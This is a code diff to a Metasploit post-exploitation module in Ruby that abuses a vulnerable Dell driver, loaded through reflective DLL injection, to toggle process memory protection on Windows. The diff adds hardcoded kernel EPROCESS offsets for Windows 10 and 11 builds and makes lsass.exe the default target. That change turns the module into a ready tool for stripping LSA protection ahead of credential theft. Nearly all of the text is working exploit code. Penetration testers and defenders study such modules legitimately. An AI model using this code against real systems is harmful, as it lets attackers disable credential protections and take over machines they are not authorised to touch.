@@ -8,6 +8,7 @@ class MetasploitModule < Msf::Post
 
   include Msf::Exploit::Local::WindowsKernel
   include Msf::Post::File
+  include Msf::Post::Process
   include Msf::Post::Windows::Priv
   include Msf::Post::Windows::Process
   include Msf::Post::Windows::ReflectiveDLLInjection
@@ -38,7 +39,7 @@ class MetasploitModule < Msf::Post
         'Platform' => 'win',
         'SessionTypes' => [ 'meterpreter' ],
         'References' => [
-          # TODO: R7 blog
+          [ 'URL', 'https://www.rapid7.com/blog/post/2021/12/13/driver-based-attacks-past-and-present/'],
           [ 'URL', 'https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection'],
           [ 'URL', 'https://itm4n.github.io/lsass-runasppl/'],
           [ 'URL', 'https://labs.sentinelone.com/cve-2021-21551-hundreds-of-millions-of-dell-computers-at-risk-due-to-multiple-bios-driver-privilege-escalation-flaws/' ],
@@ -55,19 +56,45 @@ class MetasploitModule < Msf::Post
     )
     register_options([
       OptString.new('DRIVER_PATH', [true, 'The path containing the driver inf, cat, and sys (and coinstaller)', '']),
-      OptString.new('PID', [true, 'The targetted process', '']),
+      OptInt.new('PID', [true, 'The targetted process. If set to 0 the module will automatically target lsass.exe', '0']),
       OptBool.new('ENABLE_MEM_PROTECT', [true, 'Enable or disable memory protection', 'false'])
     ])
   end
 
-  def target_compatible?
+  def get_eproc_offsets
     sysinfo_value = sysinfo['OS']
+    unless sysinfo_value =~ /Windows/
+      print_status("Target is not Windows. Found #{sysinfo_value}")
+      return nil
+    end
+
     build_num = sysinfo_value.match(/Build (\d+)/)[1].to_i
     vprint_status("Windows Build Number = #{build_num}")
 
-    return true if sysinfo_value =~ /Windows 10/ && (build_num >= 10240 && build_num <= 22000)
+    # UniqueProcessIdOffset, ActiveProcessLinksOffset, SignatureLevelOffset
+    offsets = {
+      10240 => [ 0x02e8, 0x02f0, 0x06a8 ], # Gold
+      10586 => [ 0x02e8, 0x02f0, 0x06b0 ], # 2015 update
+      14393 => [ 0x02e8, 0x02f0, 0x06c8 ], # 2016 update
+      15063 => [ 0x02e0, 0x02e8, 0x06c8 ], # April 2017 update
+      16299 => [ 0x02e0, 0x02e8, 0x06c8 ], # Fall 2017 update
+      17134 => [ 0x02e0, 0x02e8, 0x06c8 ], # April 2018 update
+      17763 => [ 0x02e0, 0x02e8, 0x06c8 ], # October 2018 update
+      18362 => [ 0x02e8, 0x02f0, 0x06f8 ], # May 2019 update
+      18363 => [ 0x02e8, 0x02f0, 0x06f8 ], # November 2019 update
+      19041 => [ 0x0440, 0x0448, 0x0878 ], # May 2020 update
+      19042 => [ 0x0440, 0x0448, 0x0878 ], # October 2020 update
+      19043 => [ 0x0440, 0x0448, 0x0878 ], # May 2021 update
+      19044 => [ 0x0440, 0x0448, 0x0878 ], # October 2021 update
+      22000 => [ 0x0440, 0x0448, 0x0878 ]  # Win 11 June/September 2021
+    }
 
-    false
+    unless offsets.key?(build_num)
+      print_status("Unknown offsets for Windows build #{build_num}")
+      return nil
+    end
+
+    return offsets[build_num]
   end
 
   def run
@@ -75,9 +102,9 @@ class MetasploitModule < Msf::Post
       fail_with(Failure::None, 'Elevated session is required')
     end
 
-    # check that the target is a compatible version of Windows (since the offsets are hardcoded) before loading the RDLL
-    unless target_compatible?
-      fail_with(Failure::NoTarget, 'The exploit does not support this target')
+    offsets = get_eproc_offsets
+    if offsets.nil?
+      fail_with(Failure::NoTarget, 'Unsupported targeted')
     end
 
     if sysinfo['Architecture'] == ARCH_X64 && session.arch == ARCH_X86
@@ -88,11 +115,24 @@ class MetasploitModule < Msf::Post
       fail_with(Failure::BadConfig, "The driver path must be a file path. User provided: #{datastore['DRIVER_PATH']}")
     end
 
+    # If the user doesn't select a PID select lsass.exe for them
+    target_pid = datastore['PID']
+    if target_pid == 0
+      target_pid = pidof('lsass.exe').first
+      print_status("Set PID option #{target_pid} for lsass.exe")
+    end
+
     params = datastore['DRIVER_PATH']
     params += ','
-    params += datastore['PID']
+    params += target_pid.to_s
     params += ','
     params += (datastore['ENABLE_MEM_PROTECT'] ? '1' : '0')
+    params += ','
+    params += offsets[0].to_s # UniqueProcessIdOffset
+    params += ','
+    params += offsets[1].to_s # ActiveProcessLinksOffset
+    params += ','
+    params += offsets[2].to_s # SignatureLevelOffset
 
     execute_dll(::File.join(Msf::Config.data_directory, 'exploits', 'dell_protect', 'dell_protect.x64.dll'), params)
 
